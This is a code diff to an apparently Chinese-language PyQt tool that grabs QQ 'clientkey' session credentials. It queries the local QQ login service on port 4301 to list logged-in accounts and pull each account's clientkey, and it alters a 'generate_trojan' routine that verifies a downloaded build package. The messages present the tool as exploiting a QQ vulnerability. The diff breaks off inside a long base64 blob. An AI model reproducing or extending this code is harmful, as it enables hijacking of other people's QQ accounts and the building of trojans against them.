@@ -11,6 +11,7 @@ import hashlib
 import os
 import subprocess
 import zipfile
+import time
 from time import sleep
 import sys
 import base64
@@ -143,7 +144,7 @@ class Ui_Dialog(object):
         self.label_5.setLayoutDirection(QtCore.Qt.LeftToRight)
         self.label_5.setObjectName("label_5")
         self.textEdit = QtWidgets.QTextEdit(Dialog)
-        self.textEdit.setGeometry(QtCore.QRect(10, 230, 682, 221))
+        self.textEdit.setGeometry(QtCore.QRect(210, 230, 481, 221))
         self.textEdit.setReadOnly(True)
         self.textEdit.setObjectName("textEdit")
         self.textEdit.textChanged.connect(lambda: self.textEdit.moveCursor(11))
@@ -205,7 +206,7 @@ class Ui_Dialog(object):
         self.pushButton_2.setGeometry(QtCore.QRect(320, 172, 221, 31))
         self.pushButton_2.setObjectName("pushButton_2")
         self.pushButton_2.clicked.connect(lambda: (self.textEdit.setText(""), Thread(
-            target=self.get_qq_info).start()) if not self.func_running else QtWidgets.QMessageBox.critical(Dialog,
+            target=self.get_uins).start()) if not self.func_running else QtWidgets.QMessageBox.critical(Dialog,
                                                                                                            "错误",
                                                                                                            "已有功能正在运行,请等待运行完毕!"))
         self.label_12 = QtWidgets.QLabel(Dialog)
@@ -236,6 +237,13 @@ class Ui_Dialog(object):
         self.pushButton_6.setGeometry(QtCore.QRect(550, 145, 141, 41))
         self.pushButton_6.setObjectName("pushButton_6")
         self.pushButton_6.clicked.connect(lambda: web_open(self.qun_url))
+        self.listWidget = QtWidgets.QListWidget(Dialog)
+        self.listWidget.setGeometry(QtCore.QRect(10, 231, 191, 221))
+        self.listWidget.setObjectName("listWidget")
+        self.listWidget.itemDoubleClicked.connect(lambda: (self.textEdit.setText(""), Thread(
+            target=self.get_info).start()) if not self.func_running else QtWidgets.QMessageBox.critical(Dialog,
+                                                                                                           "错误",
+                                                                                                           "已有功能正在运行,请等待运行完毕!"))
         self.retranslateUi(Dialog)
         QtCore.QMetaObject.connectSlotsByName(Dialog)
         self.output_signal = EmittingStream()
@@ -347,69 +355,48 @@ class Ui_Dialog(object):
         else:
             self.file_path = ""
 
-    def get_qq_info(self):
+    def get_uins(self):
         self.func_running = True
         sys.stdout = self.output_signal
+        port = '4301'
         print("[Info] 欢迎使用 QQ Clientkey 获取器!")
         print("[Warning] 请勿将本窗口任何信息透露给他人,否则后果自行承担!")
         print("[Tip] 在刚登录QQ时获取可能会出现如无法获取skey的情况,这时请重启工具获取!")
+        global session
         session = requests.session()
         try:
             print("[Info] 正在获取pt_local_token...")
-            login_htm = session.get(
+            login_html = session.get(
                 "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url=https://qzs.qq.com/qzone/v5/loginsucc.html?para=izone")
-            q_cookies = requests.utils.dict_from_cookiejar(login_htm.cookies)
+            global q_cookies
+            q_cookies = login_html.cookies.get_dict()
             pt_local_token = q_cookies.get("pt_local_token")
-            pt_login_sig = q_cookies.get("pt_login_sig")
-            print(f"[+] pt_local_token={pt_local_token}\n[+] pt_local_sig={pt_login_sig}")
-            params = {"callback": "ptui_getuins_CB",
-                      "r": "0.8987470931280881",
-                      "pt_local_tk": pt_local_token}
-            cookies = {"pt_local_token": pt_local_token,
-                       "pt_login_sig": pt_login_sig}
-            headers = {"Referer": "https://xui.ptlogin2.qq.com/",
-                       "Host": "localhost.ptlogin2.qq.com:4301",
-                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"}
+            print(f"[+] pt_local_token={pt_local_token}")
         except Exception as e:
             print(f"[ERROR] 获取pt_local_token时发生错误,原因:{e}")
             self.func_running = False
             return
         try:
             print("[Info] 正在获取本机登录QQ号..")
-            get_uin = session.get("https://localhost.ptlogin2.qq.com:4301/pt_get_uins", params=params, cookies=cookies,
-                                  headers=headers).text
-            uin_list = re.findall(r'\[([^\[\]]*)\]', get_uin)[0]
-            split_list = list(map(lambda i: i if i[0] == '{' else '{' + i, uin_list.split(',{')))
-            uin = None
-            nickname = None
-            if len(split_list) > 1:
-                print("[Info] 检测到您正在多开QQ,将使用第一个QQ号获取")
-                uin_list = json.loads(json.loads(json.dumps(split_list[0])))  # Json库我爱你loads后返回str还要再loads一次 凸(艹皿艹 )
-                uin = uin_list.get("uin")
-                nickname = uin_list.get("nickname")
-            else:
-                uin = json.loads(uin_list).get('uin')
-                nickname = json.loads(uin_list).get('nickname')
-            print(f"[+] uin={uin}\n[+] nickname={nickname}")
-            clientkey_params = {"clientuin": uin,
-                                "r": "0.14246048393632815",
-                                "pt_local_tk": pt_local_token,
-                                "callback": "__jp0"}
-            print("[Info] 正在获取clientkey...")
-            clientkey_get = session.get("https://localhost.ptlogin2.qq.com:4301/pt_get_st", cookies=cookies,
-                                        headers=headers, params=clientkey_params)
-            clientkey_cookies = requests.utils.dict_from_cookiejar(clientkey_get.cookies)
-            clientkey = clientkey_cookies.get("clientkey")
-            if not clientkey:
-                print(f"""******************信息整理******************
-[Warning]未获取到clientkey,说明您的QQ还未生成clientkey,请尝试稍等30~60秒后重启工具获取!
-uin={uin}
-nickname={nickname}
-******************感谢使用******************""",end='')
-                self.func_running = False
-                return
-            else:
-                print(f"[+] clientkey={clientkey}")
+            params = {
+                "callback": "ptui_getuins_CB",
+                "r": "0.8987470931280881",
+                "pt_local_tk": pt_local_token
+            }
+            headers = {
+                "Referer": "https://xui.ptlogin2.qq.com/",
+                "Host": f"localhost.ptlogin2.qq.com:4301",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
+            }
+            get_uins_req = session.get(f"https://localhost.ptlogin2.qq.com:4301/pt_get_uins", params=params,
+                                       cookies=q_cookies,
+                                       headers=headers, timeout=3)
+            uins = re.findall('"uin":(\d+)', get_uins_req.text)
+            nickname = re.findall('"nickname":"(.*?)"', get_uins_req.text)
+            self.listWidget.clear()
+            for i,j in zip(uins,nickname):
+                self.listWidget.addItem(f"{j}:{i}")
+            print("[Info] 请在左侧列表中选择您要获取的QQ号后双击以获取clientkey!")
         except requests.exceptions.ConnectionError as e:
             if "10054" in e.__str__(): # 10054则代表远程主机强迫关闭了一个现有的连接,即不支持(对应版本9.7.2x)
                 print(f"[ERROR] 连接失败,请检查您的QQ版本是否为9.7.2x/4301端口是否被占用,若是则说明无法使用!")
@@ -421,8 +408,70 @@ nickname={nickname}
                 print(f"[ERROR] 连接失败,原因:\n{e}")
             self.func_running = False
             return
+        except requests.exceptions.ReadTimeout:
+            print(f"[ERROR] 连接超时,请稍等10秒后重试!")
+            self.func_running = False
+            return
         except Exception as e:
-            print(f"[ERROR] 获取clientkey发生错误,原因:\n{traceback.format_exc()}{'-'*32}\n请尝试在主界面提交反馈至作者!")
+            print(f"[ERROR] 获取QQ号发生错误,原因:\n{traceback.format_exc()}{'-'*32}\n请尝试在主界面提交反馈至作者!")
+            self.func_running = False
+            return
+        self.func_running = False
+        sys.stdout = sys.__stdout__
+        
+    def get_info(self, c=0):
+        self.func_running = True
+        sys.stdout = self.output_signal
+        try:
+            if c < 1 : print("[Info] 正在获取clientkey...")
+            cookies = q_cookies
+            uin = self.listWidget.currentItem().text().split(":")[1]
+            nickname = self.listWidget.currentItem().text().split(":")[0]
+            pt_local_token = q_cookies.get("pt_local_token")
+            pt_login_sig = q_cookies.get("pt_login_sig")
+            headers = {
+                "Referer": "https://xui.ptlogin2.qq.com/",
+                "Host": f"localhost.ptlogin2.qq.com:4301",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
+            }
+            params = {
+                "clientuin": uin,
+                "r": "0.9059695467741018",
+                "pt_local_tk": pt_local_token,
+                "callback": "__jp0"
+            }
+            ck_req = session.get(f"https://localhost.ptlogin2.qq.com:4301/pt_get_st", params=params,
+                                 cookies=q_cookies, headers=headers)
+            ck_cookies = ck_req.cookies.get_dict()
+            clientkey = ck_cookies.get("clientkey")
+            if not clientkey:
+                if c < 1:
+                    self.get_info(c=1)
+                    self.func_running = False
+                    return
+                print(f"""******************信息整理******************
+[Warning]未获取到clientkey,说明您的QQ还未生成clientkey,请尝试稍等30~60秒后重新获取!
+uin={uin}
+nickname={nickname}
+******************感谢使用******************""", end='')
+                self.func_running = False
+                return
+            else:
+                print(f"[+] clientkey={clientkey}")
+        except requests.exceptions.ConnectionError as e:
+            if "10054" in e.__str__():  # 10054则代表远程主机强迫关闭了一个现有的连接,即不支持(对应版本9.7.2x)
+                print(f"[ERROR] 连接失败,请检查您的QQ版本是否为9.7.2x/4301端口是否被占用,若是则说明无法使用!")
+            elif "10061" in e.__str__():  # 10061则代表端口未开放
+                print(f"[ERROR] 连接失败,请检查是否开启QQ!")
+            elif "11004" in e.__str__():  # 访问地址被映射到一个无效的地址(如0.0.0.0)
+                print(f"[ERROR] 连接失败,疑似漏洞已被修复,请到QQkey漏洞修复器恢复!")
+            else:
+                print(f"[ERROR] 连接失败,原因:\n{e}")
+            self.func_running = False
+            return
+        except Exception as e:
+            print(
+                f"[ERROR] 获取clientkey发生错误,原因:\n{traceback.format_exc()}{'-' * 32}\n请尝试在主界面提交反馈至作者!")
             self.func_running = False
             return
         try:
@@ -524,7 +573,7 @@ nickname={nickname}
         print(f"mail_url={mail_url}")
 
         print(f"qun_url={qun_url}")
-        print("******************感谢使用******************",end='')
+        print("******************感谢使用******************", end='')
         self.lineEdit_6.setText(nickname)
         self.lineEdit_5.setText(str(uin))
         self.lineEdit_7.setText(clientkey)
@@ -540,6 +589,10 @@ nickname={nickname}
     def generate_trojan(self, reset_icon_path=False):
         sys.stdout = self.output_signal
         self.func_running = True
+        logs = []
+        installing_log = None
+        encrypting_log = None
+        packing_log = None
         try:
             if not os.path.isfile("Tools.zip"):
                 print("未检测到搭建包,请重新打开工具下载搭建包!")
@@ -548,9 +601,9 @@ nickname={nickname}
                 return
             sleep(1)
             print("正在验证文件完整性...")
-            if encrypt('Tools.zip', 'md5') == 'ba44b872e7d53f5c7dfb1da1c0d114a2':
+            if encrypt('Tools.zip', 'md5') == '6081a2b32ba7f94b8d1316dce70edf24':
                 pass
-            elif encrypt('Tools.zip', 'md5') in ['65e83fcb0f3a0f6729d24a24794eefb5','1dc8bc2b6fef8a0933f15c419f9ef99e']:
+            elif encrypt('Tools.zip', 'md5') in ['65e83fcb0f3a0f6729d24a24794eefb5','1dc8bc2b6fef8a0933f15c419f9ef99e','ba44b872e7d53f5c7dfb1da1c0d114a2']:
                 print("失败,检测到您正在使用旧版搭建包,请删除现有搭建包重新打开工具下载新版搭建包!")
                 sys.stdout = sys.__stdout__
                 self.func_running = False
@@ -565,9 +618,10 @@ nickname={nickname}
                 f.write(base64.b64decode(
                     "IyBWZXJzaW9uIDIwMjQwNDE3MDAsIExhc3QgVXBkYXRlZCBXZWQgQXByIDE3IDA3OjA3OjAxIDIwMjQgVVRDCkFBQQpBQVJQCkFCQgpBQkJPVFQKQUJCVklFCkFCQwpBQkxFCkFCT0dBRE8KQUJVREhBQkkKQUMKQUNBREVNWQpBQ0NFTlRVUkUKQUNDT1VOVEFOVApBQ0NPVU5UQU5UUwpBQ08KQUNUT1IKQUQKQURTCkFEVUxUCkFFCkFFRwpBRVJPCkFFVE5BCkFGCkFGTApBRlJJQ0EKQUcKQUdBS0hBTgpBR0VOQ1kKQUkKQUlHCkFJUkJVUwpBSVJGT1JDRQpBSVJURUwKQUtETgpBTApBTElCQUJBCkFMSVBBWQpBTExGSU5BTloKQUxMU1RBVEUKQUxMWQpBTFNBQ0UKQUxTVE9NCkFNCkFNQVpPTgpBTUVSSUNBTkVYUFJFU1MKQU1FUklDQU5GQU1JTFkKQU1FWApBTUZBTQpBTUlDQQpBTVNURVJEQU0KQU5BTFlUSUNTCkFORFJPSUQKQU5RVUFOCkFOWgpBTwpBT0wKQVBBUlRNRU5UUwpBUFAKQVBQTEUKQVEKQVFVQVJFTExFCkFSCkFSQUIKQVJBTUNPCkFSQ0hJCkFSTVkKQVJQQQpBUlQKQVJURQpBUwpBU0RBCkFTSUEKQVNTT0NJQVRFUwpBVApBVEhMRVRBCkFUVE9STkVZCkFVCkFVQ1RJT04KQVVESQpBVURJQkxFCkFVRElPCkFVU1BPU1QKQVVUSE9SCkFVVE8KQVVUT1MKQVcKQVdTCkFYCkFYQQpBWgpBWlVSRQpCQQpCQUJZCkJBSURVCkJBTkFNRVgKQkFORApCQU5LCkJBUgpCQVJDRUxPTkEKQkFSQ0xBWUNBUkQKQkFSQ0xBWVMKQkFSRUZPT1QKQkFSR0FJTlMKQkFTRUJBTEwKQkFTS0VUQkFMTApCQVVIQVVTCkJBWUVSTgpCQgpCQkMKQkJUCkJCVkEKQkNHCkJDTgpCRApCRQpCRUFUUwpCRUFVVFkKQkVFUgpCRU5UTEVZCkJFUkxJTgpCRVNUCkJFU1RCVVkKQkVUCkJGCkJHCkJICkJIQVJUSQpCSQpCSUJMRQpCSUQKQklLRQpCSU5HCkJJTkdPCkJJTwpCSVoKQkoKQkxBQ0sKQkxBQ0tGUklEQVkKQkxPQ0tCVVNURVIKQkxPRwpCTE9PTUJFUkcKQkxVRQpCTQpCTVMKQk1XCkJOCkJOUFBBUklCQVMKQk8KQk9BVFMKQk9FSFJJTkdFUgpCT0ZBCkJPTQpCT05ECkJPTwpCT09LCkJPT0tJTkcKQk9TQ0gKQk9TVElLCkJPU1RPTgpCT1QKQk9VVElRVUUKQk9YCkJSCkJSQURFU0NPCkJSSURHRVNUT05FCkJST0FEV0FZCkJST0tFUgpCUk9USEVSCkJSVVNTRUxTCkJTCkJUCkJVSUxECkJVSUxERVJTCkJVU0lORVNTCkJVWQpCVVpaCkJWCkJXCkJZCkJaCkJaSApDQQpDQUIKQ0FGRQpDQUwKQ0FMTApDQUxWSU5LTEVJTgpDQU0KQ0FNRVJBCkNBTVAKQ0FOT04KQ0FQRVRPV04KQ0FQSVRBTApDQVBJVEFMT05FCkNBUgpDQVJBVkFOCkNBUkRTCkNBUkUKQ0FSRUVSCkNBUkVFUlMKQ0FSUwpDQVNBCkNBU0UKQ0FTSApDQVNJTk8KQ0FUCkNBVEVSSU5HCkNBVEhPTElDCkNCQQpDQk4KQ0JSRQpDQwpDRApDRU5URVIKQ0VPCkNFUk4KQ0YKQ0ZBCkNGRApDRwpDSApDSEFORUwKQ0hBTk5FTApDSEFSSVRZCkNIQVNFCkNIQVQKQ0hFQVAKQ0hJTlRBSQpDSFJJU1RNQVMKQ0hST01FCkNIVVJDSApDSQpDSVBSSUFOSQpDSVJDTEUKQ0lTQ08KQ0lUQURFTApDSVRJCkNJVElDCkNJVFkKQ0sKQ0wKQ0xBSU1TCkNMRUFOSU5HCkNMSUNLCkNMSU5JQwpDTElOSVFVRQpDTE9USElORwpDTE9VRApDTFVCCkNMVUJNRUQKQ00KQ04KQ08KQ09BQ0gKQ09ERVMKQ09GRkVFCkNPTExFR0UKQ09MT0dORQpDT00KQ09NTUJBTksKQ09NTVVOSVRZCkNPTVBBTlkKQ09NUEFSRQpDT01QVVRFUgpDT01TRUMKQ09ORE9TCkNPTlNUUlVDVElPTgpDT05TVUxUSU5HCkNPTlRBQ1QKQ09OVFJBQ1RPUlMKQ09PS0lORwpDT09MCkNPT1AKQ09SU0lDQQpDT1VOVFJZCkNPVVBPTgpDT1VQT05TCkNPVVJTRVMKQ1BBCkNSCkNSRURJVApDUkVESVRDQVJECkNSRURJVFVOSU9OCkNSSUNLRVQKQ1JPV04KQ1JTCkNSVUlTRQpDUlVJU0VTCkNVCkNVSVNJTkVMTEEKQ1YKQ1cKQ1gKQ1kKQ1lNUlUKQ1lPVQpDWgpEQUJVUgpEQUQKREFOQ0UKREFUQQpEQVRFCkRBVElORwpEQVRTVU4KREFZCkRDTEsKRERTCkRFCkRFQUwKREVBTEVSCkRFQUxTCkRFR1JFRQpERUxJVkVSWQpERUxMCkRFTE9JVFRFCkRFTFRBCkRFTU9DUkFUCkRFTlRBTApERU5USVNUCkRFU0kKREVTSUdOCkRFVgpESEwKRElBTU9ORFMKRElFVApESUdJVEFMCkRJUkVDVApESVJFQ1RPUlkKRElTQ09VTlQKRElTQ09WRVIKRElTSApESVkKREoKREsKRE0KRE5QCkRPCkRPQ1MKRE9DVE9SCkRPRwpET01BSU5TCkRPVApET1dOTE9BRApEUklWRQpEVFYKRFVCQUkKRFVOTE9QCkRVUE9OVApEVVJCQU4KRFZBRwpEVlIKRFoKRUFSVEgKRUFUCkVDCkVDTwpFREVLQQpFRFUKRURVQ0FUSU9OCkVFCkVHCkVNQUlMCkVNRVJDSwpFTkVSR1kKRU5HSU5FRVIKRU5HSU5FRVJJTkcKRU5URVJQUklTRVMKRVBTT04KRVFVSVBNRU5UCkVSCkVSSUNTU09OCkVSTkkKRVMKRVNRCkVTVEFURQpFVApFVQpFVVJPVklTSU9OCkVVUwpFVkVOVFMKRVhDSEFOR0UKRVhQRVJUCkVYUE9TRUQKRVhQUkVTUwpFWFRSQVNQQUNFCkZBR0UKRkFJTApGQUlSV0lORFMKRkFJVEgKRkFNSUxZCkZBTgpGQU5TCkZBUk0KRkFSTUVSUwpGQVNISU9OCkZBU1QKRkVERVgKRkVFREJBQ0sKRkVSUkFSSQpGRVJSRVJPCkZJCkZJREVMSVRZCkZJRE8KRklMTQpGSU5BTApGSU5BTkNFCkZJTkFOQ0lBTApGSVJFCkZJUkVTVE9ORQpGSVJNREFMRQpGSVNICkZJU0hJTkcKRklUCkZJVE5FU1MKRkoKRksKRkxJQ0tSCkZMSUdIVFMKRkxJUgpGTE9SSVNUCkZMT1dFUlMKRkxZCkZNCkZPCkZPTwpGT09ECkZPT1RCQUxMCkZPUkQKRk9SRVgKRk9SU0FMRQpGT1JVTQpGT1VOREFUSU9OCkZPWApGUgpGUkVFCkZSRVNFTklVUwpGUkwKRlJPR0FOUwpGUk9OVElFUgpGVFIKRlVKSVRTVQpGVU4KRlVORApGVVJOSVRVUkUKRlVUQk9MCkZZSQpHQQpHQUwKR0FMTEVSWQpHQUxMTwpHQUxMVVAKR0FNRQpHQU1FUwpHQVAKR0FSREVOCkdBWQpHQgpHQklaCkdECkdETgpHRQpHRUEKR0VOVApHRU5USU5HCkdFT1JHRQpHRgpHRwpHR0VFCkdICkdJCkdJRlQKR0lGVFMKR0lWRVMKR0lWSU5HCkdMCkdMQVNTCkdMRQpHTE9CQUwKR0xPQk8KR00KR01BSUwKR01CSApHTU8KR01YCkdOCkdPREFERFkKR09MRApHT0xEUE9JTlQKR09MRgpHT08KR09PRFlFQVIKR09PRwpHT09HTEUKR09QCkdPVApHT1YKR1AKR1EKR1IKR1JBSU5HRVIKR1JBUEhJQ1MKR1JBVElTCkdSRUVOCkdSSVBFCkdST0NFUlkKR1JPVVAKR1MKR1QKR1UKR1VDQ0kKR1VHRQpHVUlERQpHVUlUQVJTCkdVUlUKR1cKR1kKSEFJUgpIQU1CVVJHCkhBTkdPVVQKSEFVUwpIQk8KSERGQwpIREZDQkFOSwpIRUFMVEgKSEVBTFRIQ0FSRQpIRUxQCkhFTFNJTktJCkhFUkUKSEVSTUVTCkhJUEhPUApISVNBTUlUU1UKSElUQUNISQpISVYKSEsKSEtUCkhNCkhOCkhPQ0tFWQpIT0xESU5HUwpIT0xJREFZCkhPTUVERVBPVApIT01FR09PRFMKSE9NRVMKSE9NRVNFTlNFCkhPTkRBCkhPUlNFCkhPU1BJVEFMCkhPU1QKSE9TVElORwpIT1QKSE9URUxTCkhPVE1BSUwKSE9VU0UKSE9XCkhSCkhTQkMKSFQKSFUKSFVHSEVTCkhZQVRUCkhZVU5EQUkKSUJNCklDQkMKSUNFCklDVQpJRApJRQpJRUVFCklGTQpJS0FOTwpJTApJTQpJTUFNQVQKSU1EQgpJTU1PCklNTU9CSUxJRU4KSU4KSU5DCklORFVTVFJJRVMKSU5GSU5JVEkKSU5GTwpJTkcKSU5LCklOU1RJVFVURQpJTlNVUkFOQ0UKSU5TVVJFCklOVApJTlRFUk5BVElPTkFMCklOVFVJVApJTlZFU1RNRU5UUwpJTwpJUElSQU5HQQpJUQpJUgpJUklTSApJUwpJU01BSUxJCklTVApJU1RBTkJVTApJVApJVEFVCklUVgpKQUdVQVIKSkFWQQpKQ0IKSkUKSkVFUApKRVRaVApKRVdFTFJZCkpJTwpKTEwKSk0KSk1QCkpOSgpKTwpKT0JTCkpPQlVSRwpKT1QKSk9ZCkpQCkpQTU9SR0FOCkpQUlMKSlVFR09TCkpVTklQRVIKS0FVRkVOCktEREkKS0UKS0VSUllIT1RFTFMKS0VSUllMT0dJU1RJQ1MKS0VSUllQUk9QRVJUSUVTCktGSApLRwpLSApLSQpLSUEKS0lEUwpLSU0KS0lORExFCktJVENIRU4KS0lXSQpLTQpLTgpLT0VMTgpLT01BVFNVCktPU0hFUgpLUApLUE1HCktQTgpLUgpLUkQKS1JFRApLVU9LR1JPVVAKS1cKS1kKS1lPVE8KS1oKTEEKTEFDQUlYQQpMQU1CT1JHSElOSQpMQU1FUgpMQU5DQVNURVIKTEFORApMQU5EUk9WRVIKTEFOWEVTUwpMQVNBTExFCkxBVApMQVRJTk8KTEFUUk9CRQpMQVcKTEFXWUVSCkxCCkxDCkxEUwpMRUFTRQpMRUNMRVJDCkxFRlJBSwpMRUdBTApMRUdPCkxFWFVTCkxHQlQKTEkKTElETApMSUZFCkxJRkVJTlNVUkFOQ0UKTElGRVNUWUxFCkxJR0hUSU5HCkxJS0UKTElMTFkKTElNSVRFRApMSU1PCkxJTkNPTE4KTElOSwpMSVBTWQpMSVZFCkxJVklORwpMSwpMTEMKTExQCkxPQU4KTE9BTlMKTE9DS0VSCkxPQ1VTCkxPTApMT05ET04KTE9UVEUKTE9UVE8KTE9WRQpMUEwKTFBMRklOQU5DSUFMCkxSCkxTCkxUCkxURApMVERBCkxVCkxVTkRCRUNLCkxVWEUKTFVYVVJZCkxWCkxZCk1BCk1BRFJJRApNQUlGCk1BSVNPTgpNQUtFVVAKTUFOCk1BTkFHRU1FTlQKTUFOR08KTUFQCk1BUktFVApNQVJLRVRJTkcKTUFSS0VUUwpNQVJSSU9UVApNQVJTSEFMTFMKTUFUVEVMCk1CQQpNQwpNQ0tJTlNFWQpNRApNRQpNRUQKTUVESUEKTUVFVApNRUxCT1VSTkUKTUVNRQpNRU1PUklBTApNRU4KTUVOVQpNRVJDS01TRApNRwpNSApNSUFNSQpNSUNST1NPRlQKTUlMCk1JTkkKTUlOVApNSVQKTUlUU1VCSVNISQpNSwpNTApNTEIKTUxTCk1NCk1NQQpNTgpNTwpNT0JJCk1PQklMRQpNT0RBCk1PRQpNT0kKTU9NCk1PTkFTSApNT05FWQpNT05TVEVSCk1PUk1PTgpNT1JUR0FHRQpNT1NDT1cKTU9UTwpNT1RPUkNZQ0xFUwpNT1YKTU9WSUUKTVAKTVEKTVIKTVMKTVNECk1UCk1UTgpNVFIKTVUKTVVTRVVNCk1VU0lDCk1WCk1XCk1YCk1ZCk1aCk5BCk5BQgpOQUdPWUEKTkFNRQpOQVRVUkEKTkFWWQpOQkEKTkMKTkUKTkVDCk5FVApORVRCQU5LCk5FVEZMSVgKTkVUV09SSwpORVVTVEFSCk5FVwpORVdTCk5FWFQKTkVYVERJUkVDVApORVhVUwpORgpORkwKTkcKTkdPCk5ISwpOSQpOSUNPCk5JS0UKTklLT04KTklOSkEKTklTU0FOCk5JU1NBWQpOTApOTwpOT0tJQQpOT1JUT04KTk9XCk5PV1JVWgpOT1dUVgpOUApOUgpOUkEKTlJXCk5UVApOVQpOWUMKTloKT0JJCk9CU0VSVkVSCk9GRklDRQpPS0lOQVdBCk9MQVlBTgpPTEFZQU5HUk9VUApPTExPCk9NCk9NRUdBCk9ORQpPTkcKT05MCk9OTElORQpPT08KT1BFTgpPUkFDTEUKT1JBTkdFCk9SRwpPUkdBTklDCk9SSUdJTlMKT1NBS0EKT1RTVUtBCk9UVApPVkgKUEEKUEFHRQpQQU5BU09OSUMKUEFSSVMKUEFSUwpQQVJUTkVSUwpQQVJUUwpQQVJUWQpQQVkKUENDVwpQRQpQRVQKUEYKUEZJWkVSClBHClBIClBIQVJNQUNZClBIRApQSElMSVBTClBIT05FClBIT1RPClBIT1RPR1JBUEhZClBIT1RPUwpQSFlTSU8KUElDUwpQSUNURVQKUElDVFVSRVMKUElEClBJTgpQSU5HClBJTksKUElPTkVFUgpQSVpaQQpQSwpQTApQTEFDRQpQTEFZClBMQVlTVEFUSU9OClBMVU1CSU5HClBMVVMKUE0KUE4KUE5DClBPSEwKUE9LRVIKUE9MSVRJRQpQT1JOClBPU1QKUFIKUFJBTUVSSUNBClBSQVhJClBSRVNTClBSSU1FClBSTwpQUk9EClBST0RVQ1RJT05TClBST0YKUFJPR1JFU1NJVkUKUFJPTU8KUFJPUEVSVElFUwpQUk9QRVJUWQpQUk9URUNUSU9OClBSVQpQUlVERU5USUFMClBTClBUClBVQgpQVwpQV0MKUFkKUUEKUVBPTgpRVUVCRUMKUVVFU1QKUkFDSU5HClJBRElPClJFClJFQUQKUkVBTEVTVEFURQpSRUFMVE9SClJFQUxUWQpSRUNJUEVTClJFRApSRURTVE9ORQpSRURVTUJSRUxMQQpSRUhBQgpSRUlTRQpSRUlTRU4KUkVJVApSRUxJQU5DRQpSRU4KUkVOVApSRU5UQUxTClJFUEFJUgpSRVBPUlQKUkVQVUJMSUNBTgpSRVNUClJFU1RBVVJBTlQKUkVWSUVXClJFVklFV1MKUkVYUk9USApSSUNIClJJQ0hBUkRMSQpSSUNPSApSSUwKUklPClJJUApSTwpST0NLUwpST0RFTwpST0dFUlMKUk9PTQpSUwpSU1ZQClJVClJVR0JZClJVSFIKUlVOClJXClJXRQpSWVVLWVUKU0EKU0FBUkxBTkQKU0FGRQpTQUZFVFkKU0FLVVJBClNBTEUKU0FMT04KU0FNU0NMVUIKU0FNU1VORwpTQU5EVklLClNBTkRWSUtDT1JPTUFOVApTQU5PRkkKU0FQClNBUkwKU0FTClNBVkUKU0FYTwpTQgpTQkkKU0JTClNDClNDQgpTQ0hBRUZGTEVSClNDSE1JRFQKU0NIT0xBUlNISVBTClNDSE9PTApTQ0hVTEUKU0NIV0FSWgpTQ0lFTkNFClNDT1QKU0QKU0UKU0VBUkNIClNFQVQKU0VDVVJFClNFQ1VSSVRZClNFRUsKU0VMRUNUClNFTkVSClNFUlZJQ0VTClNFVkVOClNFVwpTRVgKU0VYWQpTRlIKU0cKU0gKU0hBTkdSSUxBClNIQVJQClNIQVcKU0hFTEwKU0hJQQpTSElLU0hBClNIT0VTClNIT1AKU0hPUFBJTkcKU0hPVUpJClNIT1cKU0kKU0lMSwpTSU5BClNJTkdMRVMKU0lURQpTSgpTSwpTS0kKU0tJTgpTS1kKU0tZUEUKU0wKU0xJTkcKU00KU01BUlQKU01JTEUKU04KU05DRgpTTwpTT0NDRVIKU09DSUFMClNPRlRCQU5LClNPRlRXQVJFClNPSFUKU09MQVIKU09MVVRJT05TClNPTkcKU09OWQpTT1kKU1BBClNQQUNFClNQT1JUClNQT1QKU1IKU1JMClNTClNUClNUQURBClNUQVBMRVMKU1RBUgpTVEFURUJBTksKU1RBVEVGQVJNClNUQwpTVENHUk9VUApTVE9DS0hPTE0KU1RPUkFHRQpTVE9SRQpTVFJFQU0KU1RVRElPClNUVURZClNUWUxFClNVClNVQ0tTClNVUFBMSUVTClNVUFBMWQpTVVBQT1JUClNVUkYKU1VSR0VSWQpTVVpVS0kKU1YKU1dBVENIClNXSVNTClNYClNZClNZRE5FWQpTWVNURU1TClNaClRBQgpUQUlQRUkKVEFMSwpUQU9CQU8KVEFSR0VUClRBVEFNT1RPUlMKVEFUQVIKVEFUVE9PClRBWApUQVhJClRDClRDSQpURApUREsKVEVBTQpURUNIClRFQ0hOT0xPR1kKVEVMClRFTUFTRUsKVEVOTklTClRFVkEKVEYKVEcKVEgKVEhEClRIRUFURVIKVEhFQVRSRQpUSUFBClRJQ0tFVFMKVElFTkRBClRJUFMKVElSRVMKVElST0wKVEoKVEpNQVhYClRKWApUSwpUS01BWFgKVEwKVE0KVE1BTEwKVE4KVE8KVE9EQVkKVE9LWU8KVE9PTFMKVE9QClRPUkFZClRPU0hJQkEKVE9UQUwKVE9VUlMKVE9XTgpUT1lPVEEKVE9ZUwpUUgpUUkFERQpUUkFESU5HClRSQUlOSU5HClRSQVZFTApUUkFWRUxFUlMKVFJBVkVMRVJTSU5TVVJBTkNFClRSVVNUClRSVgpUVApUVUJFClRVSQpUVU5FUwpUVVNIVQpUVgpUVlMKVFcKVFoKVUEKVUJBTksKVUJTClVHClVLClVOSUNPTQpVTklWRVJTSVRZClVOTwpVT0wKVVBTClVTClVZClVaClZBClZBQ0FUSU9OUwpWQU5BClZBTkdVQVJEClZDClZFClZFR0FTClZFTlRVUkVTClZFUklTSUdOClZFUlNJQ0hFUlVORwpWRVQKVkcKVkkKVklBSkVTClZJREVPClZJRwpWSUtJTkcKVklMTEFTClZJTgpWSVAKVklSR0lOClZJU0EKVklTSU9OClZJVkEKVklWTwpWTEFBTkRFUkVOClZOClZPREtBClZPTFZPClZPVEUKVk9USU5HClZPVE8KVk9ZQUdFClZVCldBTEVTCldBTE1BUlQKV0FMVEVSCldBTkcKV0FOR0dPVQpXQVRDSApXQVRDSEVTCldFQVRIRVIKV0VBVEhFUkNIQU5ORUwKV0VCQ0FNCldFQkVSCldFQlNJVEUKV0VECldFRERJTkcKV0VJQk8KV0VJUgpXRgpXSE9TV0hPCldJRU4KV0lLSQpXSUxMSUFNSElMTApXSU4KV0lORE9XUwpXSU5FCldJTk5FUlMKV01FCldP